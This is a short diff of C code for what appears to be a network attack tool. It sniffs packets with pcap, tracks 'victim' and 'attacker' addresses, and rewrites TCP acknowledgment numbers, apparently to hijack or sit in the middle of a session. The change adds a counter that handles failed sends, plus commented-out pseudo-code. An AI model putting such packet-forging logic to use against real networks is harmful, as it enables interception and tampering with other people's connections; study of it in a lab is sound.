@@ -18,6 +18,7 @@ int packet_counter = 0;
 int firstime = 1;
 int bsend = 0;
 int receivedResponse = 0;
+int notsent = 0;
 
 // address ASCII arrays
 char eth_victim[ETH_ADDR_BITS], eth_attacker[ETH_ADDR_BITS], eth_new_victim[ETH_ADDR_BITS];
@@ -258,10 +259,19 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 				printf("\t\t\tack = %u\n", htonl(tcpHeader->th_ack));
 				if (receivedResponse == 1 && bsend == 1)
 				{
+					/*
+					if (tcp_pack_p->th_flags == TH_SYN || tcp_pack_p->th_flags == TH_ACK){
+					}
+
+					else if Flag & THF_FIN == TH_FIN
+
+					Else 
+
+					Ack = payload
+					*/
 					printf("\t\t\treceived response entered\n");
 					temp = (htonl(response_seq) + 1);
 					response_seq = ntohl(temp);
-					//tcpHeader->th_ack = response_seq;
 					memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
 					printf("\t\t\tmod seq = %u\n", htonl(tcpHeader->th_seq));
 					printf("\t\t\tmod ack = %u\n", htonl(tcpHeader->th_ack));
@@ -411,12 +421,20 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 			{
 				usleep(500000);
 			}
-			getVictimResponse();
+			if (notsent == 0)
+			{
+				getVictimResponse();
+			}
+			else
+			{
+				notsent--;
+			}
 		}
 		bsend = 0;
 	}
 	else
 	{
+		notsent++;
 		printf("\tPacket not sent\n\n");
 	}
 }
